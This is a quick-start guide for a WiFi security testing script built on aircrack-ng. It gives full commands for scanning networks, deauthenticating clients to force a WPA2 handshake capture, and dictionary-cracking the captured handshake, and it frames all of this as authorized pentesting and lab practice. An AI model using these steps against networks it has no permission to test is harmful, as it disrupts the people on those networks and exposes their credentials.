# Getting Started with AirHack-ng v3

Welcome! This guide will help you get up and running with the modernized version of your WiFi security testing toolkit.

## 📦 What's Included

Your toolkit now contains:

| File | Size | Purpose |
|------|------|---------|
| **airhack-ng-v3** | 19KB | Main modernized script (2026) |
| **install_dependencies.sh** | 13KB | Automatic dependency installer |
| **check-system.sh** | 7.1KB | System compatibility checker |
| **README.md** | 9.3KB | Comprehensive documentation |
| **CHANGELOG.md** | 5.9KB | Version history and changes |
| **GETTING_STARTED.md** | This file | Quick start guide |
| airhack-ng-v1 | 14KB | Original WEP script (2010) |
| airhack-ng-v2 | 16KB | Original WEP/WPA script (2010) |

## 🚀 Quick Start (5 Minutes)

### Step 1: Install Dependencies

Run the automatic installer:
```bash
cd /home/bitwise/bin/AI_AirCrack
sudo ./install_dependencies.sh
```

**What it does:**
- ✅ Detects your Linux distribution (Ubuntu, Arch, Fedora, etc.)
- ✅ Installs aircrack-ng suite
- ✅ Installs network tools (iw, ip)
- ✅ Optionally installs wordlists (rockyou.txt)
- ✅ Optionally installs terminal emulators
- ✅ Checks wireless adapter compatibility
- ✅ Creates working directory at ~/airhack-ng/

**Interactive prompts:**
- You'll be asked if you want to install optional packages
- Choose option 3 "Both" to get full functionality

### Step 2: Verify System

Check if everything is ready:
```bash
./check-system.sh
```

**Expected output:**
```
[✓] All dependencies found
[✓] Wireless interfaces found
[✓] Monitor mode: SUPPORTED
[✓] System is ready for airhack-ng-v3!
```

**If you see errors:**
- Red [✗] = Critical issue, must fix
- Yellow [!] = Warning, may still work

### Step 3: Test Basic Functionality

List your wireless interfaces:
```bash
sudo ./airhack-ng-v3 -a wlan0 --show
```

*Replace `wlan0` with your actual interface name from check-system.sh*

## 📖 First Attack Walkthrough

Let's do a complete WPA2 handshake capture and dictionary attack.

### Phase 1: Reconnaissance

**1. Enable monitor mode:**
```bash
sudo ./airhack-ng-v3 -a wlan0 --enable_monitor
```

**2. Scan for networks:**
```bash
sudo ./airhack-ng-v3 -a wlan0 --scan
```

**What to look for:**
- BSSID (MAC address of router)
- ESSID (network name)
- Channel number
- Connected clients (stations)
- Encryption type (WPA2 preferred)

**Press Ctrl+C when done scanning**

### Phase 2: Target Selection

From the scan, note:
- Target ESSID: `"MyTestNetwork"`
- Target BSSID: `AA:BB:CC:DD:EE:FF`
- Channel: `6`
- Client MAC: `11:22:33:44:55:66`

### Phase 3: Configuration

**Save the target configuration:**
```bash
sudo ./airhack-ng-v3 \
  -e "MyTestNetwork" \
  -a wlan0 \
  -c 6 \
  -b AA:BB:CC:DD:EE:FF \
  -s 11:22:33:44:55:66 \
  -g \
  --save
```

**Flags explained:**
- `-e` = Target network name
- `-a` = Your WiFi adapter
- `-c` = WiFi channel
- `-b` = Target router MAC
- `-s` = Connected client MAC
- `-g` = Auto-detect your MAC address
- `--save` = Save config to file

**Verify saved settings:**
```bash
sudo ./airhack-ng-v3 -e "MyTestNetwork" -i --show
```

### Phase 4: Capture Handshake

**Open two terminals side-by-side, or use the -k flag:**

**Terminal 1 - Start packet capture:**
```bash
sudo ./airhack-ng-v3 -e "MyTestNetwork" -i -2
```

*Wait for this to start, you'll see airodump-ng running*

**Terminal 2 - Deauth to force handshake:**
```bash
sudo ./airhack-ng-v3 -e "MyTestNetwork" -i -5
```

**Alternative (easier) - Use -k flag for auto-split:**
```bash
sudo ./airhack-ng-v3 -e "MyTestNetwork" -i -k -2 -5
```

**What to watch for:**
- Top right of airodump-ng window
- Should show: `WPA handshake: AA:BB:CC:DD:EE:FF`
- Once you see this, press Ctrl+C to stop capture

**Troubleshooting:**
- No handshake? Wait for a client to connect naturally
- Or run the deauth command (-5) again
- Make sure you have the correct client MAC (-s flag)

### Phase 5: Dictionary Attack

**Using rockyou.txt wordlist:**
```bash
sudo ./airhack-ng-v3 \
  -e "MyTestNetwork" \
  -i \
  -4 \
  --dict /usr/share/wordlists/rockyou.txt
```

**What happens:**
- Aircrack-ng will try passwords from rockyou.txt
- If found, the password will be displayed
- This can take minutes to days depending on password strength

**Custom wordlist:**
```bash
sudo ./airhack-ng-v3 -e "MyTestNetwork" -i -4 --dict /path/to/custom.txt
```

### Phase 6: Cleanup

**Disable monitor mode when done:**
```bash
sudo ./airhack-ng-v3 -a wlan0 --disable_monitor
```

**Check saved files:**
```bash
ls -lh ~/airhack-ng/
```

**You should see:**
- `MyTestNetwork.net` - Saved configuration
- `MyTestNetwork-01.cap` - Captured handshake

## 🎯 Common Use Cases

### Use Case 1: Testing Your Own Network

**Goal:** Verify your WiFi password is strong enough

```bash
# 1. Enable monitor mode
sudo ./airhack-ng-v3 -a wlan0 -em

# 2. Scan and save config
sudo ./airhack-ng-v3 -a wlan0 --scan
sudo ./airhack-ng-v3 -e "YourNetwork" -a wlan0 -c 6 -b XX:XX:XX:XX:XX:XX -s YY:YY:YY:YY:YY:YY -g --save

# 3. Capture handshake
sudo ./airhack-ng-v3 -e "YourNetwork" -i -k -2 -5

# 4. Test with common passwords
sudo ./airhack-ng-v3 -e "YourNetwork" -i -4 --dict /usr/share/wordlists/rockyou.txt

# 5. Cleanup
sudo ./airhack-ng-v3 -a wlan0 -dm
```

**If your password is cracked:** Change it immediately to something stronger!

### Use Case 2: Penetration Testing Engagement

**Goal:** Audit client's WiFi security (with authorization)

```bash
# Document authorization first!
# Save copy of authorization email/contract

# 1. Initial reconnaissance
sudo ./airhack-ng-v3 -a wlan0 -em --scan

# 2. For each target network
sudo ./airhack-ng-v3 -e "ClientNetwork" -a wlan0 -c X -b XX:XX:XX:XX:XX:XX -g --save

# 3. Capture and analyze
sudo ./airhack-ng-v3 -e "ClientNetwork" -i -k -2 -5

# 4. Report findings
# - Handshake captured: YES/NO
# - Password cracked: YES/NO
# - Time to crack: X minutes/hours
# - Recommendations: [list improvements]
```

### Use Case 3: Educational Lab

**Goal:** Learn WiFi security in controlled environment

```bash
# Set up your own test AP first (old router with WPA2)
# Set a known weak password like "password123"

# Follow Phase 1-6 above
# Observe how quickly weak passwords are cracked
# Try progressively stronger passwords

# Example progression:
# - "password" → Cracked in seconds
# - "Password123" → Cracked in minutes
# - "P@ssw0rd!2024" → Cracked in hours
# - "correct horse battery staple" → May not crack at all
```

## 🔧 Troubleshooting

### Monitor Mode Won't Enable

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Manually stop NetworkManager
sudo systemctl stop NetworkManager

# Try again
sudo ./airhack-ng-v3 -a wlan0 -em

# Restart NetworkManager when done
sudo systemctl start NetworkManager
```

### "No Wireless Interfaces Found"

**Check if WiFi is detected:**
```bash
iw dev
```

**No output?**
- Your WiFi adapter might not support monitor mode
- Try an external USB WiFi adapter (Recommended: Alfa AWUS036ACH)

### Handshake Not Capturing

**Common issues:**
1. **Wrong channel:** Make sure -c matches the AP channel
2. **No clients:** Need at least one connected device
3. **Wrong client MAC:** Use the MAC of an actually connected client
4. **Adapter range:** Get closer to the target AP

**Force a client reconnection:**
```bash
# This will disconnect the client, forcing reconnection
sudo ./airhack-ng-v3 -e "Network" -i -5
```

### Dictionary Attack Not Finding Password

**This is normal if:**
- Password is strong (15+ characters, random)
- Password is not in the wordlist
- Password uses special characters not in wordlist

**Solutions:**
- Use larger wordlists (crackstation.txt, kaonashi.txt)
- Create custom wordlist based on target info
- Use GPU-accelerated tools (hashcat) for faster cracking
- Generate wordlist with rules (john the ripper)

## 📚 Next Steps

### Learn More

1. **Read the full README:**
   ```bash
   cat README.md
   ```

2. **View all options:**
   ```bash
   sudo ./airhack-ng-v3 --help
   ```

3. **Study the changelog:**
   ```bash
   cat CHANGELOG.md
   ```

### Practice Safely

1. **Set up a test lab:**
   - Old router with WPA2
   - Known password
   - Isolated from production network

2. **Join CTF competitions:**
   - HackTheBox
   - TryHackMe
   - PicoCTF

3. **Get certified:**
   - CEH (Certified Ethical Hacker)
   - OSCP (Offensive Security Certified Professional)
   - GPEN (GIAC Penetration Tester)

### Expand Your Toolkit

**Related tools to learn:**
```bash
# WPA3 and PMKID attacks
sudo apt install hcxdumptool hcxtools

# GPU-accelerated cracking
sudo apt install hashcat

# Wireless auditing
sudo apt install wifite

# Packet analysis
sudo apt install wireshark
```

## ⚠️ Legal and Ethical Reminder

### ✅ DO:
- Test your own networks
- Test with written authorization
- Document your authorization
- Report findings responsibly
- Respect scope of engagement
- Follow responsible disclosure

### ❌ DON'T:
- Test networks without permission
- Access data beyond scope
- Share credentials you discover
- Use for malicious purposes
- Ignore local laws
- Test in public places without authorization

### 📄 Keep Authorization Documented

Always keep:
- Written permission email
- Scope of work document
- Timeline of authorized testing
- Contact information for escalation

## 🆘 Getting Help

**If you encounter issues:**

1. **Check the system:**
   ```bash
   ./check-system.sh
   ```

2. **Re-read the README:**
   ```bash
   less README.md
   ```

3. **Check aircrack-ng documentation:**
   - https://aircrack-ng.org/documentation.html

4. **Community forums:**
   - r/AskNetsec (Reddit)
   - Security StackExchange
   - Kali Linux forums

## 🎓 Learning Resources

**WiFi Security:**
- WiFi Hacking 101: https://github.com/v1s1t0r1sh3r3/airgeddon
- Aircrack-ng Tutorial: https://www.aircrack-ng.org/doku.php?id=tutorial

**Penetration Testing:**
- OWASP Testing Guide
- The Hacker Playbook 3
- Penetration Testing: A Hands-On Introduction

**Wireless Networking:**
- 802.11 Security
- Wireless Network Security (SANS)

---

**Happy (ethical) hacking! 🔒**

Remember: These tools are powerful. Use them responsibly and only where authorized.
